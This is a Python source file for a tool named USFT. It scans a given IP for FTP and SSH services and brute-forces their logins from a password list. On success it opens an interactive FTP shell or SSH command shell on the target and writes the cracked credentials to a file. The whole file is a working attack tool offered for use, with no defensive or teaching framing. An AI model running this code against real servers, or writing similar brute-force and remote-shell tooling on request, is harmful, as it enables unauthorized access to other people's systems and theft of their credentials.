import ftplib, socket, paramiko
def FileOpener(Directoy): # Checks if a file exists
    try:
        file=open(Directoy,"r")
        file.close()
        return True
    except:
        return False
def SSHBruteForce(ip,username,ListDirectory): ##ssh brute force tool
    flag= True
    passwords = open(ListDirectory,"r")#opens the password file
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())#Mandatory
    for password in passwords:#Tries to connect until a successful logon
        try:
            password = password.replace("\n","")
            ssh.connect(ip,22,username,password)
            print(f"The password {password} is correct! ")
            passwords.close()
            return password
        except:#if a login results in an error
            print(f"The password {password} is not correct! ")
    return ""#if a password was not found, returning ""
def ftpBruteForce(ip,username,passwordlist): #FTP Brute force tool
        sockey = ftplib.FTP(timeout=5)
        passwords=open(passwordlist,"r")#Opens password list
        for lines in passwords:
            sockey.connect(ip, 21)#connects to the ftp service
            lines = lines.replace("\n","")#delets blank lines
            try:
                sockey.login(username,lines)#Tries the current password in the file
                print(f"the password is {lines}")#if successful, will print the password
                sockey.close()
                return lines#returns the password
            except:
                sockey.close()
                print(f"the password {lines} is incorrect")
                sockey.close()
                continue
        return ""#if a password was not found, returning ""

def FTPSHELL(ip,username,password): #FTP SHELL FUNCTION
    ftp=ftplib.FTP(timeout=5)
    ftp.connect(ip,21)
    ftp.login(username,password)#connects to the ftp server
    command=""
    while command != "exit":
        try:
                command = input("Here is the menu \n[1] for pwd \n[2] for cwd\n[3] for dir\n[4] to upload file "
                                "\n[5] to download file \n'exit' for exit")#menu for ftp commands
                if command == "1":#Prints the working directory
                    print(ftp.pwd())
                if command == "2":#Changes the working directory
                    try:
                        directory = input("What directory to change to?")
                        ftp.cwd(directory)
                        print("Successful")
                    except:
                        print("Not a valid Directory")
                if command == "3":#Prints the content of the directory
                    print(ftp.dir())
                if command == "4":#Uploads a file to the ftp server
                    try:
                        file=input("What file to upload? (Please state full directory")
                        upload = open(file,'rb')
                        ftp.storbinary(f"STOR {file}",upload)
                        upload.close()
                    except:
                        print('Not a valid file')
                        continue
                if command == "5":#Downloads a file from the ftp server
                    try:
                        filename=input("What file to download?")##file name
                        with open(filename, "wb") as file:
                            ftp.retrbinary(f"RETR {filename}", file.write)
                    except:
                        print("Error")

        except:
             print("Not a valid command")
def SSHSHELL(ip,username,paswword):#SSH Shell
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip,22,username,paswword) #Connecting to the server
    command = ""
    while True:
        try:
            print("Write exit to exit")
            command=input("$:")
            if command.lower() == "exit":#if the user inputs exit, the command will not be executed
                break
            else:
               stdin, stdout, stderr = ssh.exec_command(command)#executing the user's inputted command
               print(stdout.read().decode())  # printing the result
               print(stderr.read().decode())
        except:
            print("Not a valid command")
def USFT():
    RealSSHPassword=""
    RealFTPPassword=""
    SSHusername=""
    ftpusername=""
    while True:
        ip = input("Enter an ip to connect to\n")#ip to try to connect to
        for port in range(21,23):
            SecFlag= True
            sock = socket.socket()
            try:
                flag = True
                answer = sock.connect((ip,port))#seeing if the port is open
                print(f"the port {port} is open on {ip}")
                while flag == True:
                    answer = input("Would you like to preform a brute-force attack on that service?\n")#If the port is open, the user will be prompted to preform a brute-force attack on that service
                    if "yes" in answer.lower() and port == 21:#in case of ftp
                        while SecFlag==True:
                            ftpusername = input("Enter a username\n")
                            passwordList = input("Enter a password list directory\n")#the user enters a password file and a username
                            if FileOpener(passwordList):#checking that the file is valid
                                SecFlag=False
                                RealFTPPassword=ftpBruteForce(ip,ftpusername,passwordList)#Brute-Force tool
                                if RealFTPPassword =="": #in case a password was not found
                                    while True:
                                        sshAns=input("Password not found, would you like to try again?\n")
                                        if sshAns.lower() == "yes":
                                            SecFlag=True
                                            break
                                        elif sshAns.lower() == "no":
                                            print ("Ok, continuing")
                                            ftpusername = "Not Found"
                                            flag=False
                                            SecFlag=False
                                            break
                                        else:
                                            print("Please answer in yes or no")
                                            HoFlag = False
                                else:#if a password was found
                                    Lflag=True
                                    while Lflag:
                                        ShellAns=input("Would you like to open a FTP shell?\n")
                                        if ShellAns.lower() == "yes":
                                            FTPSHELL(ip,ftpusername,RealFTPPassword)#opens a ftp shell
                                            Lflag = False
                                            flag = False
                                            SecFlag= False
                                        elif "no" in ShellAns.lower():#The user has chosen not to open a shell
                                            print("Quitting")
                                            Lflag = False
                                            flag = False
                                        else:
                                            print("Please state your answer in 'yes' or 'no' ")
                            else:
                                print("Not a valid file")


                    if "yes" in answer.lower() and port==22:#The user wants to preform a brute-force attack on the ssh port
                        while SecFlag == True:
                            SSHusername=input("Enter a username\n")
                            passwordList = input("Enter a password list directory\n")#user enters password directory and username
                            if FileOpener(passwordList):#Valiadating that the file exists
                                SecFlag = False
                                RealSSHPassword=SSHBruteForce(ip,SSHusername,passwordList)#Brute-forcing the ssh service
                                if RealSSHPassword == "":#If a password was not found
                                    while True:
                                        sshAns = input("Password not found, would you like to try again?\n")
                                        if sshAns.lower() == "yes":
                                            SecFlag = True
                                            break
                                        elif sshAns.lower() == "no":
                                            print("Ok, continuing")
                                            SSHusername = "Not Found"
                                            flag = False
                                            SecFlag = False
                                            break
                                        else:
                                            print("Please answer in yes or no")
                                            HoFlag = False
                                else:
                                    ShellAns = input("Would you like to open a SSH shell?\n")#Asking the user if he would like to open an ssh shell
                                    if ShellAns.lower() == "yes":
                                        SSHSHELL(ip,SSHusername,RealSSHPassword)#opening the shell
                                        flag = False
                                        Lflag = False
                                        SecFlag = False
                                    elif "no" in ShellAns.lower():#User does not want to open a shell
                                        print("Quitting")
                                        flag = False
                                        Lflag = False
                                    else:
                                        print("Please state your answer in 'yes' or 'no' ")
                            else:
                                print("Not a valid file")#If the file the user tried to open does not exist, he will get this prompt

                    elif "no" in answer.lower():#The user does not want to preform a brute-force attack
                        print("OK")
                        flag = False
                    if answer.lower() != "no" and answer.lower() !="yes":#If the user decides to be annoying
                        print("Please state your answer in 'yes' or 'no' ")
                sock.close()#closing the socket
            except:
                print(f"the port {port} is closed on {ip}")#If a port is closed, this prompt will be shown to the user
        LastAnswer=input("would you like to write all the passwords to a file?")#if the user wants to save the results into a file
        if "yes" in LastAnswer.lower():#if yes
            while True:
                endFile=input("what file to save it to?")#asks where to save it to
                if FileOpener(endFile):#if the file exists
                    with open(endFile,"a") as final:
                        final.write(f"the ip is: {ip} the ftp username is: {ftpusername}  the ftp password is: {RealFTPPassword}\n")
                        final.write(f"the ip is: {ip} the ssh username is: {SSHusername}  the ssh password is: {RealSSHPassword}\n")
                        final.close()#writes the ssh and ftp credentials to the file
                        break
                else:
                    print("Not a valid file")#The file to write to is not valid
                    continue
            if "no" in LastAnswer.lower():#User does not want to print to a file
                print("Bye")
            else:
                print("Please write in yes or no")#User tries to mess with the code
                continue

        if __name__ == '__main__':
            print("USFT Tool By Eylon Iyov")#Credits
        break


USFT()